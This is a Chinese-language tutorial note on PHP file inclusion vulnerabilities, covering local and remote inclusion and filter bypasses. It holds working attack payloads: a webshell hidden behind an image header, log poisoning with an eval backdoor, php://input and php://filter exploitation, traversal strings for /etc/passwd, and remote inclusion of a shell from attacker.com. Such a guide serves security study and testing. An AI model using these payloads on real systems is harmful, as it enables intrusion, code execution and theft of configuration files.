## 概述 (Overview)

为了提高代码的重用性，Web开发语言（如PHP、JSP、ASP等）提供了文件包含功能，允许开发者将一个文件的代码嵌入到另一个文件中执行。 文件包含漏洞发生在以下情况：

1.  应用程序使用了文件包含函数。
2.  被包含的文件路径或文件名是由用户可控的变量决定的。
3.  应用程序没有对用户提供的输入进行充分的验证和过滤。

攻击者可以利用此漏洞，让文件包含函数去包含并执行一个“意想不到”的文件，这可能导致敏感信息泄露（例如读取配置文件）、任意代码执行（例如包含WebShell），甚至在某些情况下导致服务器被完全控制。

虽然文件包含功能存在于多种编程语言中，但由于PHP提供的包含功能非常灵活（特别是支持URL包含），这类漏洞在PHP应用中最为常见且危害通常更大。

**示例代码 (PHP):**

```php
<?php
  // 示例1: ?page=a.php
  // 用户可以通过URL参数 ?page=somefile.php 来控制包含哪个文件
  $page = $_GET['page'];
  include($page); // 如果$page未经过滤，则存在文件包含漏洞

  // 示例2: ?home=b.html
  $home = $_GET['home'];
  include("pages/" . $home); // 可能存在目录遍历和文件包含漏洞

  // 示例3: ?file=content
  $file = $_GET['file'];
  include($file . ".php"); // 可能通过 %00 截断或其他技巧绕过后缀限制
?>
````

## 涉及的危险函数 (PHP)

以下是PHP中常用的文件包含函数，若使用不当可能导致漏洞：

- include: 执行到include时才包含文件。如果找不到被包含的文件，只会产生警告（E_WARNING），脚本将继续执行。
    
- include_once: 功能与include类似，但会检查文件是否已经被包含过，如果已包含则不会再次包含。
    
- require: 在脚本开始运行时就包含文件。如果找不到被包含的文件，会产生致命错误（E_COMPILE_ERROR），并停止脚本执行。
    
- require_once: 功能与require类似，但会检查文件是否已经被包含过，如果已包含则不会再次包含。
    

## 漏洞分类 (Vulnerability Classification)

### 本地文件包含 (Local File Inclusion - LFI)

- **描述**: 仅能够包含服务器本地存在的文件。
    
- **影响**: 由于攻击者通常不能直接控制服务器上的文件内容，LFI主要用于读取敏感文件，如系统配置文件 (/etc/passwd, C:\Windows\System32\drivers\etc\hosts)、应用程序源码、日志文件等。
    
- **结合利用**: LFI漏洞常与文件上传漏洞结合使用。攻击者先上传一个包含恶意代码的文件（如WebShell），然后利用LFI漏洞包含并执行该上传的文件，从而获得代码执行权限。
    

### 远程文件包含 (Remote File Inclusion - RFI)

- **描述**: 能够通过URL地址包含远程服务器上的文件。
    
- **影响**: 危害通常比LFI更大，因为攻击者可以直接构造一个包含恶意代码的文件放在自己的服务器上，然后让目标服务器包含并执行它，轻松实现任意代码执行。
    
- **前提条件**: RFI的利用需要目标服务器PHP配置中以下选项开启（在现代PHP版本中默认是关闭的，增加了利用难度）：
    
    - allow_url_fopen = On (默认开启)
        
    - allow_url_include = On (默认关闭)
        
- 注意: magic_quotes_gpc = off (此选项在PHP 5.4后已废弃) 曾对某些绕过技巧有影响，但不是RFI的直接必要条件。
    

## 常见利用技巧与绕过方法 (Common Exploitation Techniques and Bypass Methods)

### 1. 结合文件上传 (Combining with File Uploads)

将恶意代码（小马/WebShell）与合法文件（如图片）结合，绕过上传限制，再利用LFI包含。

- **方法一：伪造图片头**: 在脚本文件内容前添加图片文件头标识，如 GIF89a。
    
    ```
    GIF89a
    <?php phpinfo(); ?>
    ```
- **方法二：使用命令行合并**: 在Windows系统下使用 copy 命令将图片和脚本合并。
- 
    ```
    copy /b image.png + shell.php webshell.png
    ```
- **方法三：使用工具**: 利用特定工具（如exiftool或专门的图片木马生成器）将代码写入图片的元数据或其他允许的位置。
    

### 2. 日志投毒 (Log Poisoning)

当存在LFI漏洞但无法上传文件时，可以尝试将恶意代码注入到服务器日志文件中（如Apache的访问日志 access.log 或错误日志 error.log），然后包含日志文件来执行代码。

- **步骤**:
    
    1. 确认日志文件路径（可能需要猜测或通过其他信息泄露得知）。确保Web服务有写入日志的权限，并且日志文件可被Web应用读取。(部分配置可能需要修改，如取消注释 httpd.conf 中的 CustomLog 指令，但这通常是服务器管理员的操作，攻击者利用的是现有配置)。
        
    2. 发送一个包含恶意代码的HTTP请求，例如将PHP代码放在URL参数或User-Agent头中。
        
        ```
        GET /index.php?page=<?php @eval($_POST['cmd']);?> HTTP/1.1
        Host: vulnerable.com
        User-Agent: <?php system('id');?>
        ```
    3. 服务器会将包含恶意代码的请求记录到日志文件中（注意URL编码，可能需要使用Burp Suite等工具发送原始未编码的请求）。
        
        - access.log 可能记录：192.168.1.100 - - [10/Oct/2023:...] "GET /index.php?page=%3C%3Fphp%20@eval($_POST[%27cmd%27]);%3F%3E HTTP/1.1" 200 ...
            
    4. 利用LFI漏洞包含日志文件。
        
        ```
        http://vulnerable.com/index.php?page=../../../../var/log/apache2/access.log
        ```
        或 (如果使用了 Burp Suite 发送原始 Payload)
        ```
        http://vulnerable.com/index.php?page=../../../../var/log/apache2/access.log&cmd=ls -al
        ```


### 3. 利用PHP Wrapper读取文件 (php://filter)

php://filter 是一种元封装器，允许在读取文件时应用过滤器。常用于读取PHP文件源码（避免被执行）或其他任意文件内容。

- **构造URL**:
    
    ```
    http://vulnerable.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
    ```
- **说明**:
    
    - read=convert.base64-encode: 指定读取时使用base64编码过滤器。
        
    - resource=config.php: 指定要读取的目标文件。
        
- **结果**: 页面会返回config.php文件内容的Base64编码字符串，解码后即可获得源码。
    

### 4. 利用PHP Wrapper执行/写入代码 (php://input)

php://input 是一个只读流，可以访问请求的原始POST数据体。如果存在文件包含漏洞，并且 allow_url_include = On，可以利用 php://input 来执行任意PHP代码。

- **构造请求**:
    
    1. 设置URL包含 php://input：
        
        ```
        http://vulnerable.com/index.php?page=php://input
        ```
    2. 使用POST方法发送请求，并在请求体中放入要执行的PHP代码：
        
        ```
        POST /index.php?page=php://input HTTP/1.1
        Host: vulnerable.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 28
        
        <?php system('net user'); ?>
        ```
- **结果**: 服务器会执行POST数据中的PHP代码 (system('net user');)，并将结果显示在响应页面中（如果PHP配置允许显示输出，如未禁用system且display_errors开启）。
    

### 5. 绕过过滤 (str_replace 等)

开发者可能会使用 str_replace 或类似函数过滤掉敏感字符/路径，如 ../、..\、http://、https:// 等。

- **绕过 ../ 或 ..\ 过滤**:
    
    - **路径嵌套**: 使用多余的 /./ 或 ../ 组合，如果过滤不严谨，可能在替换后仍能构成有效的目录穿越路径。
        
        ```
        ?page=....//....//....//etc/passwd
        ?page=..././..././..././etc/passwd
        ```
        (效果取决于具体的过滤逻辑)
        
    - **编码**: 尝试URL编码 (%2e%2e%2f), 双重URL编码 (%252e%252e%252f) 等。
        
    - **绝对路径**: 如果知道Web目录的绝对路径，可以直接使用，不受相对路径过滤影响。
        
        ```
        ?page=C:/xampp/htdocs/dvwa/config.inc.php
        ?page=/var/www/html/config.php
        ```
  
- **绕过 http:// 或 https:// 过滤 (用于RFI)**:
    
    - **大小写混合**: ?page=hTtP://attacker.com/shell.txt
        
    - **双写/嵌套**: 如果只替换一次，可以尝试嵌套。
        
        ```
        ?page=htthttp://p://attacker.com/shell.txt
        ```
        (替换后变成 http://attacker.com/shell.txt)
        
    - **使用其他协议**: 如果目标允许，尝试 ftp://, https:// (如果只过滤了http://) 等。
        

### 6. 绕过文件名检查 (fnmatch / file://)

有时开发者会限制只能包含特定模式的文件名，例如使用 fnmatch("file*", $filename) 强制必须以 "file" 开头。

- **利用 file:// 协议**: file:// 协议用于访问本地文件系统，其本身就以 "file" 开头，可以用来绕过这种检查。
    
    ```
    // 假设代码类似:
    // if (!fnmatch("file*", $_GET['page']) && $_GET['page'] != "include.php") {
    //    die("Invalid file.");
    // }
    // include($_GET['page']);
    
    // 绕过URL:
    ?page=file:///etc/passwd
    ?page=file:///C:/Windows/System32/drivers/etc/hosts
    ```

### 7. PHP封装协议 (PHP Wrappers / Protocols)

PHP支持多种内置的URL风格封装协议，可用于文件系统函数，这些协议在文件包含漏洞中非常有用：

- file:// — 访问本地文件系统。
    
- http:// — 访问 HTTP(s) 网址 (需要 allow_url_fopen=on)。
    
- ftp:// — 访问 FTP(s) URLs (需要 allow_url_fopen=on)。
    
- php:// — 访问各个输入/输出流 (I/O streams)。常用的有：
    
    - php://filter — 应用过滤器到流。
        
    - php://input — 访问原始请求体 (常用于POST)。
        
    - php://output — 只写流，允许向输出缓冲区写入。
        
    - php://stdin, php://stdout, php://stderr — 访问标准输入、输出、错误流。
        
- zlib:// — 压缩流。
    
- data:// — 数据流 (RFC 2397)，例如 data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== (需要 allow_url_fopen=on)。
    
- glob:// — 查找匹配的文件路径模式。
    
- ssh2:// — Secure Shell 2。
    
- expect:// — 处理交互式的流。
    

如果后端对某些协议进行了限制，可以尝试使用列表中的其他协议进行绕过。

[[常见敏感文件路径]]